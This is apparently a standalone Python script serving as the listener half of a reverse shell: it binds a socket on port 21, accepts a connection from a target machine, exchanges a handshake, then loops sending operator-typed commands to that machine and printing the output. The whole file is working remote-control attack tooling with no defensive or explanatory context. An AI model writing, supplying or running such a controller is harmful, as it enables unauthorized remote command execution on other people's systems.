import socket
import time
def create_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 21))
    s.listen(1)
    print("WAITING...")
    return s

def accept_connection(s):
    tar, addr = s.accept()
    print(f"Connect  {addr}")
    handshake(tar)
    res = tar.recv(1024)
    shell = tar.recv(1024)
    print(f'''
 ┌───────────────────────────────────────────┐
 │      3333333                   3          │
 │   333      3333               33          │
 │  33           33             333          │
 │  3             3           33333          │
 │  33            3          33  33          │
 │   333         33        333   33          │
 │               3        33     33          │
 │              3                33          │
 │             33                33          │
 │          3333     33          33          │
 │      3333333333333            33          │
 │    3333                 33333333333333333 │
 │                        33                 │
 └───────────────────────────────────────────┘
    {res.decode()}''')
    return tar,shell.decode()
def handshake(tar):
    tar.send(b'tff')

def handle_client(tar,shell):
    cmd = ''
    while cmd != '/21':
        cmd = input(f'{shell}> ')
        if cmd!='':
            tar.send(cmd.encode())
            res = tar.recv(1024).decode()
            if res:
                print(f"{res}")
            else:
                print("No response received or connection lost.")
        time.sleep(1)


def close_server(s, tar):
    tar.close()
    s.close()

def main():
    s = create_server()
    tar,shell = accept_connection(s)
    try:
        handle_client(tar,shell)

    except KeyboardInterrupt:
        print('\n[exited]')
    finally:
        close_server(s, tar)
main()

